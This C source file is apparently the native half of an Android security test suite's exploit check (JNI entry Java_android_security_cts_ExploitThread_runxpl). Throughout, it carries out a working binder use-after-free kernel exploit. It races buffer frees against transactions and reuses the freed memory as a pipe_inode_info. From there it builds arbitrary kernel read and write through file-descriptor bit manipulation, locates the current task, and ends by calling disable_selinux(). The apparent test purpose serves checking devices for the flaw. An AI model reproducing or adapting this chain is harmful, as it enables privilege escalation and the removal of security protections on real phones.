void open_binders() {
    u32 xchg;
    bnd1 = get_binder(&xchg);
    exchg_put_binder(bnd1, xchg);
    dec_ref(bnd1, xchg);
    bnd2 = get_binder(&xchg);
    to1 = exchg_get_binder(bnd2, xchg);
    dec_ref(bnd1, xchg);
}

void make_pipe_path() {
    size_t l = strlen(pipedir);
    pipepath = malloc(l + 4); // "/pd\0"
    strcpy(pipepath, pipedir);
    pipepath[l++] = '/';
    pipeid = pipepath + l;
}

int open_pipe(int idx) {
    if (!pipepath)
        make_pipe_path();
    sprintf(pipeid, "p%d", idx);
    int fd = open(pipepath, O_RDWR);
    if (fd < 0)
        fail("pipe open fail");
    return fd;
}

void open_pipes() {
    for (int i = 0; i < PIPES; i++)
        pipefd[i] = open_pipe(i);
}

int do_poll(int fd, int timeout) {
    struct pollfd pfd;
    pfd.fd = fd;
    pfd.events = 0;
    pfd.revents = 0;
    if (poll(&pfd, 1, timeout) < 0)
        fail("pipe poll fail");
    return pfd.revents;
}

int find_bad_pipe() {
    for (int i = 0; i < PIPES; i++) {
        if (do_poll(pipefd[i], 0) & POLLHUP) {
            dbg("corrupted pipe at %d", i);
            bad_pipe = pipefd[i];
            sprintf(pipeid, "p%d", i);
            return 1;
        }
    }
    return 0;
}

void close_pipes() {
    for (int i = 0; i < PIPES; i++) {
        if (close(pipefd[i]) < 0)
            fail("close pipe fail, i=%d fd=%d", i, pipefd[i]);
    }
}

void free_thread(u64 arg) {
    set_timerslack();
    set_cpu(cpu1);
    set_idle();
    time_t test_started = start_timer();
    while (timer_active(test_started)) {
        sync_wait(free_sync);
        buf_t *buf = new_buf();
        buf_u32(buf, BC_FREE_BUFFER);
        buf_uintptr(buf, free_ptr);
        struct binder_write_read bwr;
        memset(&bwr, 0x00, sizeof(bwr));
        bwr.write_buffer = (u64)buf->p;
        bwr.write_size = buf->off;
        int off = cpu1 < 4 ? 1300 : 350;
        u64 target_time = trigger_time - off;
        while (time_now() < target_time)
            ;
        ioctl(bnd1, BINDER_WRITE_READ, &bwr);
        free_buf(buf);
        sync_done(free_sync);
    }
};

void race_cycle() {
    dbg("race cycle, this may take time...");
    time_t test_started = start_timer();
    while (timer_active(test_started)) {
        send_txn(bnd2, to1, 0, NULL, NULL);
        txn_t t1, t2;
        recv_txn(bnd1, &t1);
        free_ptr = txn_buf(&t1);
        trigger_time = time_now() + 100000;
        sync_signal(free_sync);
        sleep_until(trigger_time);
        send_reply(bnd1);
        open_pipes();
        recv_txn(bnd2, &t2);
        free_txn(&t2);
        sync_wait_done(free_sync);
        if (find_bad_pipe())
            break;
        close_pipes();
    }
}

void reopen_pipe() {
    uaf_pipe = open(pipepath, O_WRONLY);
    if (uaf_pipe < 0)
        fail("reopen pipe fail");
}

void stage2_thread(u64 cpu);

void stage2_launcher(u64 arg) {
    dup2(uaf_pipe, 0);
    dup2(bnd1, 1);
    dup2(bnd2, 2);
    for (int i = 3; i < 1024; i++)
        close(i);
    unshare_following_clone_files();
    int cpu_count =  android_getCpuCount();
    for (int cpu = 0; cpu < cpu_count; cpu++) {
        if (cpu_available(cpu)) {
            for (int i = 0; i < STAGE2_THREADS; i++)
                launch_thread("txnuaf.stage2", stage2_thread, NULL, cpu, 0);
        }
    }
}

void signal_xpl_threads() {
    sync_signal(stage2_sync1);
    sync_wait_done(stage2_sync1);
    sync_signal(stage2_sync2);
    sync_wait_done(stage2_sync2);
}

void launch_stage2_threads() {
    stage2_sync1 = alloc_sync();
    stage2_sync2 = alloc_sync();
    sync_set_num_waiters(stage2_sync1, STAGE2_THREADS);
    sync_set_num_waiters(stage2_sync2, (tot_cpus - 1) * STAGE2_THREADS);
    hook_clone();
    unshare_following_clone_files();
    launch_thread("txnuaf.stage2_launcher", stage2_launcher, NULL, 0, 0);
    // set cpu
    signal_xpl_threads();
}

void alloc_txns(int n) {
    total_txns += n;
    size_t totsz = n * (4 + sizeof(struct binder_transaction_data));
    buf_t *buf = new_buf_sz(totsz);
    for (int i = 0; i < n; i++) {
        buf_u32(buf, BC_TRANSACTION);
        struct binder_transaction_data *tr;
        tr = buf_alloc(buf, sizeof(*tr));
        tr->target.handle = to1;
        tr->code = 0;
        tr->flags |= TF_ONE_WAY;
        tr->data.ptr.buffer = 0;
        tr->data.ptr.offsets = 0;
        tr->data_size = 0;
        tr->offsets_size = 0;
    }
    binder_write(bnd2, buf);
}

void recv_all_txns(int fd) {
    for (int i = 0; i < total_txns; i++) {
        txn_t t;
        recv_txn(fd, &t);
        free_txn(&t);
    }
}

void clean_slab() {
    // clean node
    alloc_txns(4096);
    // clean each cpu
    int cpu_count =  android_getCpuCount();
    for (int i = 0; i < cpu_count; i++) {
        if (cpu_available(i)) {
            set_cpu(i);
            alloc_txns(512);
        }
    }
    set_cpu(cpu1);
    // for good measure
    alloc_txns(128);
}

void poll_thread(u64 arg) {
    set_timerslack();
    sync_wait(poll_sync);
    do_poll(uaf_pipe, 200);
    dbg("poll timeout");
    sync_done(poll_sync);
}

void free_pipe_alloc_fdmem() {
    clean_slab();
    sync_signal(poll_sync);
    usleep(50000);
    if (close(bad_pipe) < 0) {
        fail("free close fail");
        return;
    }
    // alloc fdmem
    signal_xpl_threads();
    // set all bits
    signal_xpl_threads();
    dbg("fdmem spray done");
    sync_wait_done(poll_sync);
    recv_all_txns(bnd1);
}

void find_pipe_slot_thread() {
    signal_xpl_threads();
    if (!uaf_alloc_success)
        fail("inode_info uaf alloc fail - this may sometimes happen, "
             "kernel may crash after you close the app");
}

void set_all_bits() {
    for (int i = 0x1ff; i >= 3; i--)
        if (dup2(1, i) < 0)
            fail("dup2 fail, fd=%d", i);
}

void winfo32_lo(int addr, u32 dat) {
    int startbit = addr ? 0 : 3;
    addr *= 8;
    for (int i = startbit; i < 32; i++) {
        int fd = addr + i;
        if (dat & (1ul << i)) {
            if (dup2(1, fd) < 0)
                fail("winfo dup2 fail, fd=%d", fd);
        } else {
            if (close(fd) < 0 && errno != EBADF)
                fail("winfo close fail, fd=%d", fd);
        }
    }
}

void winfo32_hi(int addr, u32 dat) {
    addr *= 8;
    for (int i = 0; i < 32; i++) {
        u32 bit = dat & (1u << i);
        int fd = addr + i;
        if (fcntl(fd, F_SETFD, bit ? FD_CLOEXEC : 0) < 0) {
            if (errno != EBADF || bit)
                fail("winfo fcntl fail fd=%d", fd);
        }
    }
}

void winfo32(int addr, u32 dat) {
    if (addr < 0x40)
        winfo32_lo(addr, dat);
    else
        winfo32_hi(addr - 0x40, dat);
}

void winfo64(int addr, u64 dat) {
    winfo32(addr, dat);
    winfo32(addr + 4, dat >> 32);
}

u64 rinfo64(int addr) {
    addr *= 8;
    u64 ret = 0;
    for (int i = 0; i < 64; i++) {
        int fd = addr + i;
        fd_set set;
        FD_ZERO(&set);
        FD_SET(fd, &set);
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 0;
        if (select(fd + 1, &set, NULL, NULL, &timeout) >= 0)
            ret |= 1ul << i;
        else if (errno != EBADF)
            fail("leak select fail");
    }
    return ret;
}

int files_off = 0x30;
int file_off = 0x48;
int fdt_off = 0x58;
int fmode_off = 0x78;
int faoff = 0x10;

void set_pipe_mutex_count(u32 count) {
    winfo32(0, count);
}

void set_pipe_nrbufs(u32 nrbufs) {
    winfo32(0x40, nrbufs);
}

void set_pipe_curbuf(u32 curbuf) {
    winfo32(0x44, curbuf);
}

void set_pipe_buffers(u32 buffers) {
    winfo32(0x48, buffers);
}

void set_pipe_readers(u32 readers) {
    winfo32(0x4c, readers);
}

void set_pipe_fasync_readers(u64 fasync_readers) {
    winfo64(0x70, fasync_readers);
}

void set_pipe_wait_next(u64 next) {
    winfo64(0x30, next);
}

u64 get_pipe_wait_next() {
    return rinfo64(0x30);
}

void set_fa_magic(u32 magic) {
    winfo32(faoff + 4, magic);
}

void set_fa_next(u64 next) {
    winfo64(faoff + 0x10, next);
}

void set_fa_file(u64 file) {
    winfo64(faoff + 0x18, file);
}

u64 get_mutex_owner() {
    return rinfo64(0x18);
}

void set_files_count(int count) {
    winfo32(files_off, count);
}

void set_files_fdt(u64 fdt) {
    winfo64(files_off + 0x20, fdt);
}

void set_fdt_max_fds(u32 max_fds) {
    winfo32(fdt_off, max_fds);
}

void set_fdt_fdarr(u64 fdarr) {
    winfo64(fdt_off + 8, fdarr);
}

void set_fdt_close_on_exec(u64 close_on_exec) {
    winfo64(fdt_off + 0x10, close_on_exec);
}

void set_file_fmode(u32 fmode) {
    winfo32(fmode_off, fmode);
}

void set_file(u64 file) {
    winfo64(file_off, file);
}

void stage2();

void stage2_thread(u64 cpu) {
    sync_t *sync = cpu == cpu1 ? stage2_sync1 : stage2_sync2;
    sync_wait(sync);
    do_set_cpu(cpu);
    sync_done(sync);

    sync_wait(sync);
    if (dup2(1, 0x1ff) < 0) {
        fail("dup2 fail");
        return;
    }
    sync_done(sync);

    sync_wait(sync);
    set_all_bits();
    sync_done(sync);

    sync_wait(sync);
    u64 wait_list = get_pipe_wait_next();
    int ok = wait_list != -1l;
    if (ok) {
        uaf_alloc_success = 1;
        pipe_inode_info = wait_list - 0x30;
        dbg("pipe_inode_info=%016zx", pipe_inode_info);
    }
    sync_done(sync);
    if (ok)
        stage2();
}

void write_pipe_ptr_to(u64 addr) {
    set_pipe_wait_next(addr - 8);
    do_poll(0, 50);
}

void overwrite_pipe_bufs() {
    write_pipe_ptr_to(pipe_inode_info + 0x80);
}

void leak_task_ptr() {
    set_pipe_mutex_count(0x7);
    set_pipe_wait_next(pipe_inode_info + 0x30);
    u64 faptr = pipe_inode_info + faoff;
    set_pipe_fasync_readers(faptr);
    set_pipe_nrbufs(3);
    set_pipe_curbuf(0);
    set_pipe_buffers(4);
    set_pipe_readers(1);
    set_fa_magic(0x4601);
    set_fa_next(faptr);
    set_fa_file(0xfffffffful); // overlaps with inode_info.wait.lock
    sync_signal(rw_thread_sync);
    // wait for rw thread to write mutex owner
    usleep(100000);
    rw_task = get_mutex_owner();
    dbg("rw_task=%016zx", rw_task);
    // unblock rw thread
    set_fa_magic(0);
    if (syscall(SYS_tkill, rw_thread_tid, SIGUSR2) < 0)
        fail("tkill fail");
    dbg("signaled rw_thread");
    sync_wait_done(rw_thread_sync);
    // wait until klogd has logged the bad magic number error
    sleep(1);
}

void overwrite_task_files(u64 task) {
    write_pipe_ptr_to(task + 0x7c0);
}

void sigfunc(int a) {
}

enum {cmd_read, cmd_write, cmd_exit};

void handle_sig() {
    struct sigaction sa;
    memset(&sa, 0x00, sizeof(sa));
    sa.sa_handler = sigfunc;
    if (sigaction(SIGUSR2, &sa, NULL) < 0)
        fail("sigaction fail");
}

void rw_thread(u64 idx) {
    handle_sig();
    sync_wait(rw_thread_sync);
    void *dat = malloc(0x2000);
    dbg("starting blocked write");
    if (write(uaf_pipe, dat, 0x2000) != 0x1000) {
        fail("expected blocking write=0x1000");
        return;
    }
    dbg("write unblocked");
    sync_done(rw_thread_sync);
    int done = 0;
    while (!done) {
        sync_wait(rw_thread_sync);
        if (rw_cmd == cmd_read) {
            int bits = fcntl(rw_bit, F_GETFD);
            if (bits < 0) {
                fail("F_GETFD fail");
                return;
            }
            rw_val = !!(bits & FD_CLOEXEC);
        } else if (rw_cmd == cmd_write) {
            if (fcntl(rw_bit, F_SETFD, rw_val ? FD_CLOEXEC : 0) < 0) {
                fail("F_SETFD fail");
                return;
            }
        } else {
            done = 1;
        }
        sync_done(rw_thread_sync);
    }
}

void set_fdarr(int bit) {
    set_fdt_fdarr(pipe_inode_info + file_off - bit * 8);
}

u8 r8(u64 addr) {
    u8 val = 0;
    set_fdt_close_on_exec(addr);
    for (int bit = 0; bit < 8; bit++) {
        set_fdarr(bit);
        rw_bit = bit;
        rw_cmd = cmd_read;
        sync_signal(rw_thread_sync);
        sync_wait_done(rw_thread_sync);
        val |= rw_val << bit;
    }
    return val;
}

void w8(u64 addr, u8 val) {
    set_fdt_close_on_exec(addr);
    for (int bit = 0; bit < 8; bit++) {
        set_fdarr(bit);
        rw_bit = bit;
        rw_val = val & (1 << bit);
        rw_cmd = cmd_write;
        sync_signal(rw_thread_sync);
        sync_wait_done(rw_thread_sync);
    }
}

void exit_rw_thread() {
    rw_cmd = cmd_exit;
    sync_signal(rw_thread_sync);
    sync_wait_done(rw_thread_sync);
}

void w16(u64 addr, u16 val) {
    w8(addr, val);
    w8(addr + 1, val >> 8);
}

void w32(u64 addr, u32 val) {
    w16(addr, val);
    w16(addr + 2, val >> 16);
}

void w64(u64 addr, u64 val) {
    w32(addr, val);
    w32(addr + 4, val >> 32);
}

u16 r16(u64 addr) {
    return r8(addr) | (r8(addr + 1) << 8);
}

u32 r32(u64 addr) {
    return r16(addr) | (r16(addr + 2) << 16);
}

u64 r64(u64 addr) {
    return r32(addr) | (u64)r32(addr + 4) << 32;
}

#define magic 0x55565758595a5b5cul

void set_up_arbitrary_rw() {
    overwrite_task_files(rw_task);
    set_all_bits();
    set_files_count(1);
    set_files_fdt(pipe_inode_info + fdt_off);
    set_fdt_max_fds(8);
    set_file(pipe_inode_info + fmode_off - 0x44);
    set_file_fmode(0);
    u64 magic_addr = scratch;
    w64(magic_addr, magic);
    if (r64(magic_addr) != magic)
        fail("rw test fail");
    dbg("got arbitrary rw");
}

u64 get_current() {
    int our_tid = gettid();
    u64 leader = r64(rw_task + 0x610);
    u64 task = leader;

    time_t test_started = start_timer();
    while (timer_active(test_started)) {
        int tid = r32(task + 0x5d0);
        if (tid == our_tid)
            return task;
        task = r64(task + 0x680) - 0x680;
        if (task == leader)
            break;
    }
    fail("current not found");
    return (u64)-1;
}

void get_fdarr() {
    current = get_current();
    if (current == (u64)-1) {
        return;
    }
    dbg("current=%016zx", current);
    u64 files = r64(current + 0x7c0);
    u64 fdt = r64(files + 0x20);
    fdarr = r64(fdt + 8);
}

void place_bnd_buf(u64 v1, u64 v2, txn_t *t) {
    txn_t t2;
    int do_free = !t;
    if (!t)
        t = &t2;
    buf_t *dat = new_buf();
    buf_u64(dat, v1);
    buf_u64(dat, v2);
    send_txn(2, to1, 0, dat, NULL);
    recv_txn(1, t);
    if (do_free)
        free_txn(t);
    send_reply(1);
    recv_txn(2, &t2);
    free_txn(&t2);
}

void w128(u64 addr, u64 v1, u64 v2) {
    w64(free_data, addr);
    w64(next_free_data, addr + 0x10);
    place_bnd_buf(v1, v2, NULL);
}

void set_up_w128() {
    u64 bnd = get_file(1);
    u64 proc = r64(bnd + 0xd0);
    u64 alloc = proc + 0x1c0;
    enter_looper(1);
    txn_t t1, t2;
    place_bnd_buf(0, 0, &t1);
    place_bnd_buf(0, 0, &t2);
    free_txn(&t1);
    u64 free_buffer = r64(alloc + 0x48);
    u64 next = r64(free_buffer);
    w64(alloc + 0x38, 0);
    w64(alloc + 0x78, ~0ul);
    free_data = free_buffer + 0x58;
    next_free_data = next + 0x58;
    u64 magic_addr = scratch + 8;
    w128(magic_addr, magic, magic);
    if (r64(magic_addr) != magic || r64(magic_addr + 8) != magic)
        fail("w128 test fail");
    dbg("got w128");
}

void clean_up() {
    w64(fdarr, 0);
    set_files_count(2);
    exit_rw_thread();
}

void exploit() {
    set_thread_name("txnuaf");
    select_cpus();
    set_cpu(cpu1);
    set_timerslack();
    launch_threads();
    open_binders();
    race_cycle();
    reopen_pipe();
    launch_stage2_threads();
    free_pipe_alloc_fdmem();
    find_pipe_slot_thread();
}

void stage2() {
    scratch = pipe_inode_info + 0xb8;
    overwrite_pipe_bufs();
    leak_task_ptr();
    set_up_arbitrary_rw();
    get_fdarr();
    set_up_w128();
    winfo32(0, 0x7);
    disable_selinux();
    clean_up();
}

JNIEXPORT void JNICALL
Java_android_security_cts_ExploitThread_runxpl(JNIEnv *e, jobject t, jstring jpipedir) {
    this = (*e)->NewGlobalRef(e, t);
    add_jenv(e);
    (*e)->GetJavaVM(e, &jvm);
    jclass cls = (*e)->GetObjectClass(e, this);
    add_log = (*e)->GetMethodID(e, cls, "addLog", "(Ljava/lang/String;)V");
    pipedir = (*e)->GetStringUTFChars(e, jpipedir, NULL);
    exploit();
    (*e)->ReleaseStringUTFChars(e, jpipedir, pipedir);
}
